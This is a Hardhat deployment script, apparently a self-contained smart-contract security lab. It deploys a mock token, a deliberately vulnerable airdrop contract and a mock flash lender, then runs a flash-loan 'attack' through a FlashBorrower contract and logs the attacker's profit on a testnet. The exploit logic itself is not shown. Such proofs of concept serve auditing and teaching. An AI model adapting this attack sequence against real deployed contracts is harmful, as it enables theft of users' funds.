const { ethers } = require("hardhat");

async function main() {
    console.log("Starting full attack sequence...");
    const [attacker] = await ethers.getSigners();
    console.log(`Attacker wallet: ${attacker.address}`);

    const Token = await ethers.getContractFactory("ERC20Mock");
    const token = await Token.deploy("Test Token", "TST", attacker.address, ethers.parseEther("20000000"));
    await token.waitForDeployment();
    const tokenAddress = await token.getAddress();
    console.log(`Token deployed: ${tokenAddress}`);

    const Airdrop = await ethers.getContractFactory("VulnerableAirdrop");
    const airdrop = await Airdrop.deploy(tokenAddress);
    await airdrop.waitForDeployment();
    const airdropAddress = await airdrop.getAddress();
    console.log(`Airdrop deployed: ${airdropAddress}`);

    await (await token.transfer(airdropAddress, ethers.parseEther("10000000"))).wait();
    console.log(`Airdrop funded with 10M tokens.`);

    const Lender = await ethers.getContractFactory("MockFlashLender");
    const lender = await Lender.deploy();
    await lender.waitForDeployment();
    const lenderAddress = await lender.getAddress();
    console.log(`Lender deployed: ${lenderAddress}`);

    await (await token.transfer(lenderAddress, ethers.parseEther("5000000"))).wait();
    console.log(`Lender funded with 5M tokens.`);

    const FlashBorrower = await ethers.getContractFactory("FlashBorrower");
    const borrower = await FlashBorrower.deploy(lenderAddress, airdropAddress, tokenAddress);
    await borrower.waitForDeployment();
    const borrowerAddress = await borrower.getAddress();
    console.log(`Attacker contract deployed: ${borrowerAddress}`);

    const borrowAmount = ethers.parseEther("100000");
    console.log(`Executing attack...`);
    
    try {
        const tx = await borrower.executeAttack(borrowAmount, { gasLimit: 3000000 });
        await tx.wait();
        
        console.log("ATTACK SUCCESSFUL!");
        
        const profit = await token.balanceOf(borrowerAddress);
        console.log(`Attacker Profit: ${ethers.formatEther(profit)} tokens`);
        console.log(`Tx: https://sepolia.etherscan.io/tx/${tx.hash}`);

    } catch (error) {
        console.error("Attack failed!");
        console.log("Reason:", error.message);
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
